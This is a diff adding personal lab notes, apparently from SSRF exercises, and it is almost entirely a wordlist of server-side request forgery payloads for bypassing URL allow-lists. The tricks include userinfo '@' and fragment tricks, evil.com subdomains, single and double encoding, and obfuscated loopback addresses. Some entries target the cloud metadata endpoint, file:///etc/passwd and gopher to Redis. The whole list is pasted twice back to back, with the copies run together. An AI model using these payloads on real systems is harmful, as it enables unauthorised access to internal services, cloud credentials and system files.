@@ -167,3 +167,169 @@ try :
 127.1/admi%25%36%65  --> double URL encode -> access
 
 
+
+Lab 4 : 
+# ================================
+#  SSRF WHITELIST BYPASS PAYLOADS
+# ================================
+
+# 1) USERINFO (@) BYPASSES
+https://expected-host@evil.com
+https://expected-host:fakepass@evil.com
+https://expected-host:80@127.0.0.1
+https://expected-host:anypwd@169.254.169.254/latest/meta-data/
+https://expected-host:xyz@localhost
+
+# 2) FRAGMENT (#) BYPASSES
+https://evil.com#expected-host
+https://127.0.0.1#expected-host
+https://evil.com/path#expected-host.com
+https://internal.com/resource#expected-host
+
+# 3) DNS SUBDOMAIN TRICKS
+https://expected-host.evil.com
+https://expected-host.com.evil.com
+https://expected-host.safe.evil.com
+https://expected-host.localhost.run
+https://expected-host.127.0.0.1.nip.io
+https://expected-host.127.0.0.1.nip.io/admin
+
+# 4) URL ENCODING TRICKS (single-encoded)
+https://evil.com%23expected-host
+https://evil.com%2F..%2Fexpected-host
+https://evil.com/%2e%2e/%2e%2e/127.0.0.1
+https://127.0.0.1%3A80
+
+# 5) DOUBLE ENCODING TRICKS
+https://evil.com%2523expected-host
+https://evil.com%252F..%252F..%252F127.0.0.1
+https://127.0.0.1%253A80
+https://evil.com/%252e%252e/%252e%252e/127.0.0.1
+
+# 6) MIXED ENCODING
+https://evil.com/%25%32%35%23expected-host
+https://evil.com/%25%33%41%23expected-host
+https://evil.com/%25%32%46%23expected-host
+
+# 7) SCHEME MIXING / REDIRECT BAITS
+https://expected-host@evil.com:80/http://127.0.0.1/admin
+https://expected-host.evil.com        # -> Redirect to internal host
+https://expected-host.evil.com/login  # -> Redirect to http://127.0.0.1
+
+# 8) IPV6 + OBFUSCATED IP
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+http://2130706433/        # decimal 127.0.0.1
+http://0177.0.0.1/        # octal
+http://0x7f000001/        # hex
+
+# 9) ALTERNATE PROTOCOLS (if backend supports)
+gopher://127.0.0.1:6379/_INFO
+ftp://127.0.0.1/
+file:///etc/passwd
+
+# 10) COMBINATIONS (REAL BREAKERS)
+
+# userinfo + fragment  (YOU ASKED FOR THIS SPECIFICALLY)
+https://expected-host:pass@evil.com#expected-host
+
+# userinfo + DNS
+https://expected-host:fake@evil.expected-host.evil.com
+
+# fragment + encoding
+https://evil.com%23expected-host
+
+# double encoding + IPv6
+http://[::ffff:127.0.0.1]%2523expected-host/
+
+# userinfo + redirect
+https://expected-host@evil.com -> 301 -> http://127.0.0.1:80/admin
+
+# credential injection + encoded slash
+https://expected-host:pwd@evil.com%2f..%2f127.0.0.1
+
+# ================================
+# END OF WORDLIST
+# ================================# ================================
+#  SSRF WHITELIST BYPASS PAYLOADS
+# ================================
+
+# 1) USERINFO (@) BYPASSES
+https://expected-host@evil.com
+https://expected-host:fakepass@evil.com
+https://expected-host:80@127.0.0.1
+https://expected-host:anypwd@169.254.169.254/latest/meta-data/
+https://expected-host:xyz@localhost
+
+# 2) FRAGMENT (#) BYPASSES
+https://evil.com#expected-host
+https://127.0.0.1#expected-host
+https://evil.com/path#expected-host.com
+https://internal.com/resource#expected-host
+
+# 3) DNS SUBDOMAIN TRICKS
+https://expected-host.evil.com
+https://expected-host.com.evil.com
+https://expected-host.safe.evil.com
+https://expected-host.localhost.run
+https://expected-host.127.0.0.1.nip.io
+https://expected-host.127.0.0.1.nip.io/admin
+
+# 4) URL ENCODING TRICKS (single-encoded)
+https://evil.com%23expected-host
+https://evil.com%2F..%2Fexpected-host
+https://evil.com/%2e%2e/%2e%2e/127.0.0.1
+https://127.0.0.1%3A80
+
+# 5) DOUBLE ENCODING TRICKS
+https://evil.com%2523expected-host
+https://evil.com%252F..%252F..%252F127.0.0.1
+https://127.0.0.1%253A80
+https://evil.com/%252e%252e/%252e%252e/127.0.0.1
+
+# 6) MIXED ENCODING
+https://evil.com/%25%32%35%23expected-host
+https://evil.com/%25%33%41%23expected-host
+https://evil.com/%25%32%46%23expected-host
+
+# 7) SCHEME MIXING / REDIRECT BAITS
+https://expected-host@evil.com:80/http://127.0.0.1/admin
+https://expected-host.evil.com        # -> Redirect to internal host
+https://expected-host.evil.com/login  # -> Redirect to http://127.0.0.1
+
+# 8) IPV6 + OBFUSCATED IP
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+http://2130706433/        # decimal 127.0.0.1
+http://0177.0.0.1/        # octal
+http://0x7f000001/        # hex
+
+# 9) ALTERNATE PROTOCOLS (if backend supports)
+gopher://127.0.0.1:6379/_INFO
+ftp://127.0.0.1/
+file:///etc/passwd
+
+# 10) COMBINATIONS (REAL BREAKERS)
+
+# userinfo + fragment  (YOU ASKED FOR THIS SPECIFICALLY)
+https://expected-host:pass@evil.com#expected-host
+
+# userinfo + DNS
+https://expected-host:fake@evil.expected-host.evil.com
+
+# fragment + encoding
+https://evil.com%23expected-host
+
+# double encoding + IPv6
+http://[::ffff:127.0.0.1]%2523expected-host/
+
+# userinfo + redirect
+https://expected-host@evil.com -> 301 -> http://127.0.0.1:80/admin
+
+# credential injection + encoded slash
+https://expected-host:pwd@evil.com%2f..%2f127.0.0.1
+
+# ================================
+# END OF WORDLIST
+# ================================
+
